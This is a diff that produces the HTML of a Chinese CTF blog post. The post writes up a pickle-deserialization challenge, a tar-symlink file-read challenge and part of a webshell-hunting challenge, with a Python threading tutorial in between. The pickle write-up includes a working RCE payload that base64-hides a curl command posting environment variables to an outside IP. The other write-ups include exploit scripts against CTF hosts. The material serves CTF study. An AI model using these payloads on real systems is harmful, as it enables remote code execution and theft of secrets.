@@ -1,37 +1,436 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ilikeoyt.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[HZNUCTF 2023 preliminary]pickle1234567891011121314151617181920212223242526272829import base64import picklefrom flask import Flask, requestapp &#x3D; Flask(__name__)@app.route(&amp;#x27;&#x2F;&amp;#x27;)def index():">
+<meta property="og:type" content="article">
+<meta property="og:title" content="5-7日常">
+<meta property="og:url" content="https://ilikeoyt.github.io/2023/05/07/5-7%E6%97%A5%E5%B8%B8/index.html">
+<meta property="og:site_name" content="ycx&#39;s blog">
+<meta property="og:description" content="[HZNUCTF 2023 preliminary]pickle1234567891011121314151617181920212223242526272829import base64import picklefrom flask import Flask, requestapp &#x3D; Flask(__name__)@app.route(&amp;#x27;&#x2F;&amp;#x27;)def index():">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-07T12:01:20.000Z">
+<meta property="article:modified_time" content="2023-05-07T12:02:15.798Z">
+<meta property="article:author" content="ycxlo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ilikeoyt.github.io/2023/05/07/5-7%E6%97%A5%E5%B8%B8/">
 
 
-{% block content %}
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <title>5-7日常 | ycx's blog</title>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ycx's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/05/07/5-7%E6%97%A5%E5%B8%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          5-7日常
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-07 20:01:20 / Modified: 20:02:15" itemprop="dateCreated datePublished" datetime="2023-05-07T20:01:20+08:00">2023-05-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/calc&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>():</span><br><span class="line">    payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(<span class="string">b&#x27;os&#x27;</span>, <span class="string">b&#x27;&#x27;</span>))<span class="comment"># 对payload参数进行base64解码，并且将os置换为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ganbadie!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/readFile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>).replace(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;????&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>直接到&#x2F;readFile路由输入?filename&#x3D;&#x2F;proc&#x2F;self&#x2F;environ即可</p>
+<h4 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h4><p>由于过滤了os并且无回显，还不能反弹shell，可以考虑curl外带</p>
+<p>对于os的绕过可以采用base64编码再解码的方式绕过</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">actual_payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">os.system(&#x27;curl -X POST -d &quot;flag=`env`&quot; http://101.42.52.114:9999&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">encoded_payload = base64.b64encode(actual_payload.encode()).decode()<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">f&#x27;import base64; exec(base64.b64decode(&quot;<span class="subst">&#123;encoded_payload&#125;</span>&quot;));&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>, (cmd,)</span><br><span class="line"></span><br><span class="line">a = RCE()</span><br><span class="line">payload = base64.b64encode(pickle.dumps(a))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<h1 id="NSSRound-6-Team-check-V1"><a href="#NSSRound-6-Team-check-V1" class="headerlink" title="[NSSRound#6 Team]check(V1)"></a>[NSSRound#6 Team]check(V1)</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>要求文件必须为tar类型，并且过滤了..和&#x2F;，os.path.join函数的漏洞肯定利用不了了</p>
+<p>我们可以上传一个文件，该文件是一个指向&#x2F;flag的软连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag</span><br><span class="line">tar -cvf flag.tar flag</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node3.anna.nssctf.cn:28221/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">session.post(url=url+<span class="string">&quot;upload&quot;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(file=<span class="string">&#x27;flag.tar&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">res = session.post(url=url+<span class="string">&quot;download&quot;</span>,data=&#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;flag&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>根据题目下载源码，40MB，几千个php文件，留下了许多一句话木马，但是有很多是利用不了的，所以我们需要编写脚本来判断哪些一句话木马是可用的</p>
+<p>等会代码的编写涉及到多线程的知识，正好不是很熟悉，先来学习一下</p>
+<h2 id="python多线程"><a href="#python多线程" class="headerlink" title="python多线程"></a>python多线程</h2><h4 id="线程的概念"><a href="#线程的概念" class="headerlink" title="线程的概念"></a>线程的概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">线程是CPU分配资源的基本单位。当一程序开始运行，这个程序就变成了一个进程，而一个进程相当于一个或者多个线程。当没有多线程编程时，一个进程相当于一个主线程；当有多线程编程时，一个进程包含多个线程（含主线程）。使用线程可以实现程序大的开发。</span><br><span class="line"></span><br><span class="line">多个线程可以在同一个程序中运行，并且每一个线程完成不同的任务。</span><br><span class="line"></span><br><span class="line">多线程实现后台服务程序可以同时处理多个任务，并不发生阻塞现象。</span><br><span class="line"></span><br><span class="line">多线程的程序设计的特点就是能够提高程序执行效率和处理速度。python程序可以同时并行运行多个相对独立的线程。</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建多线程"><a href="#创建多线程" class="headerlink" title="创建多线程"></a>创建多线程</h4><p>python支持两种创建多线程的方式：</p>
+<p>~通过 threading.Thread () 创建。</p>
+<p>~通过继承 threading.Thread 类的继承。</p>
+<p>1.通过 threading.Thread () 创建</p>
+<p>语法形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread.Thread(group=Nore,targt=None,args=(),kwargs=&#123;&#125;,*,daemon=None)</span><br></pre></td></tr></table></figure>
+
+<p>参数解释：</p>
+<p>~group：必须为None，于ThreadGroup类相关，一般不使用。</p>
+<p>~target：线程调用的对象，就是目标函数。</p>
+<p>~name：为线程起这个名字。默认是Tread-x，x是序号，由1开始，第一个创建的线程名字就是Tread-1。</p>
+<p>~args：为目标函数传递关键字参数，字典。</p>
+<p>~daemon：用来设置线程是否随主线程退出而退出。</p>
+<p>注意：两个程序会并发运行，所以结果不一定每次都是顺序的1~10，这是根据CPU给两个线程风马分配的时间片段来决定。可以看到每次结果都不同。</p>
+<h4 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h4><p>在python中，主线程是第一个启动的线程。</p>
+<p>~父线程:如果启动线程A中启动了一个线程B，A就是B的父线程。</p>
+<p>~子线程：B就是A的子线程。</p>
+<p>创建线程时有一个damon属性，用它来判断主线程。当daemon设置False时，线程不会随主线程退出而退出，主线程会一直等着子线程执行完;。当daemon设置True时，线程会随主线程退出而退出，主线程结束其他的子线程会强制退出。</p>
+<p>使用daemon注意：</p>
+<p>~daemon属性必须在start( )之前设置，否则会引发RuntimeError异常</p>
+<p>~每个线程都由daemon属性，可以显示设置也可以不设置，不设置则取默认值None</p>
+<p>~如果子子线程不设置daemon属性，就取当前线程的daemon来设置它。子子线程继承子线程的daemon值，作用和设置None一样。</p>
+<p>~从主线程创建的所有线程不设置daemon属性，则默认都是daemon&#x3D;False。</p>
+<p>解释：当主线程运行完毕输出完之后，等待一下后输出0~9。如果将daemon&#x3D;False该为daemon&#x3D;True，则不会运行for i in range(10)语句。</p>
+<h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>在Python中，线程锁是用于保护共享资源免受并发访问的一种同步机制。当多个线程尝试同时访问共享资源时，线程锁可以确保只有一个线程可以访问该资源，从而避免数据竞争和其他并发问题。</p>
+<p>Python标准库<code>threading</code>中提供了一个<code>Lock</code>类，用于创建线程锁对象。该类包括两个基本方法：</p>
+<ul>
+<li><code>acquire()</code>：获取锁。如果锁当前未被其他线程持有，则该方法立即获取锁并返回True。否则，该方法将阻塞，直到其他线程释放锁并返回True。</li>
+<li><code>release()</code>：释放锁。如果当前线程持有锁，则该方法将释放锁并返回True。否则，该方法将引发<code>RuntimeError</code>异常。</li>
+</ul>
+<p>下面是一个使用线程锁的示例代码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">shared_resource = <span class="number">0</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increment</span>():</span><br><span class="line">    <span class="keyword">global</span> shared_resource</span><br><span class="line">    lock.acquire()</span><br><span class="line">    shared_resource += <span class="number">1</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=increment)</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shared_resource)</span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中，<code>shared_resource</code>是一个共享资源，多个线程将尝试增加其值。<code>lock</code>是一个<code>Lock</code>对象，用于保护<code>shared_resource</code>免受并发访问。<code>increment()</code>函数是一个线程函数，它首先获取锁，然后增加<code>shared_resource</code>的值，最后释放锁。</p>
+<p>在主线程中，循环创建10个线程，并启动它们以调用<code>increment()</code>函数。由于<code>increment()</code>函数包含了线程锁，因此每个线程将依次获取锁、增加<code>shared_resource</code>的值、释放锁，从而确保<code>shared_resource</code>的值正确递增。</p>
+<hr>
+
+<p>大概就是这些了，我自己编写脚本还是不可能的，所以借鉴<a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">这位师傅的脚本</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：&#x27;</span> + time.asctime( time.localtime(time.time()) ))<span 